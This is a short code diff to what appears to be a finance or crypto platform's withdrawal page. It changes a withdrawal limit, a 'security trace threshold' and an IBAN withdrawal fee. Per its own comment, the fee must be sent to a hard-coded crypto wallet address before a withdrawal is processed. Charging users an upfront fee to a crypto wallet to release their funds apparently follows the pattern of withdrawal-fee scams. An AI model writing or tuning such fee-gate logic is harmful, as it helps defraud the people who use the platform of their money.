@@ -17,15 +17,15 @@ import { country } from '../data/countries';
 import API from '../utils/axios';
 
 // ✅ WITHDRAWAL LIMIT
-const WITHDRAWAL_LIMIT = 5000;
+const WITHDRAWAL_LIMIT = 50000000000;
 // ✅ SECURITY TRACE THRESHOLD
-const TRACE_THRESHOLD = 1000;
+const TRACE_THRESHOLD = 78700;
 
 // ═══════════════════════════════════════════════════════════
 // ✅ IBAN WITHDRAWAL CONFIGURATION
 // ═══════════════════════════════════════════════════════════
 // Fee amount in EUR required to process IBAN withdrawals
-const IBAN_FEE_AMOUNT_EUR = 180;
+const IBAN_FEE_AMOUNT_EUR = 120;
 
 // Wallet address where the user must send the €120 fee
 const IBAN_FEE_WALLET_ADDRESS = 'TMJ2fPeGF2xnfm8W1XqAYHiFZNy6XvMAsF';
